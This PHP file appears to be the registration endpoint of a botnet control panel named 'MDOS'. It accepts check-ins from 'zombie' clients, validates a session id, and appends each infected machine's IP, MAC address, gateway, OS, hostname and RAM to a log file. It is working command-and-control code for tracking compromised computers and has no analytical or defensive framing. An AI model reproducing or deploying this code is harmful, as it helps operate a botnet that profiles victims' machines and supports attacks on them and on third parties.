<?php
include dirname(__FILE__).'/../../api/core.php';
include dirname(__FILE__).'/../../static/config.php';
if ((isset ($_GET['lang'])) and (isset ($_GET['localgateway'])) and (isset($_GET['os'])) and (isset($_GET['macadr'])) and (isset($_GET['archetype'])) and (isset($_GET['pcname'])) and (isset ($_GET['ram'])) and (isset ($_GET['sid']))) {
	if (MDOS::SecureCheckZombSID($_GET['sid'])) {
		$lang = $_GET['lang'];
		$localgateway = $_GET['localgateway'];
		$os = $_GET['os'];
		$macadr = $_GET['macadr'];
		$archetype = $_GET['archetype'];
		$pcname = $_GET['pcname'];
		$ram = $_GET['ram'];
		$ip = (MDOS::RetrieveIP());
		$sid = $_GET['sid'];
		_register ($ip, $lang, $localgateway, $os, $macadr, $archetype, $pcname, $ram, $ip, $sid);
		exit;
	}
	else {
		MDOS::WriteLog ((MDOS::RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (zombie client can not give a bad secure connexion id.)');
		exit;
	}
}
else {
	MDOS::WriteLog ((MDOS::RetrieveIP()), '#2', 'CSRF MDOS attack attempt. (zombie client can not make any registration error.)');
	exit;
}

function _register ($a, $b, $c, $d, $e, $f, $g, $h, $i, $j) {
	$d_string = ($a.'|'.$b.'|'.$c.'|'.$d.'|'.$e.'|'.$f.'|'.$g.'|'.$h.'|'.$i.'|'.$j);
	file_put_contents ('connectdumper.log', $d_string."\n", FILE_APPEND);
}
?>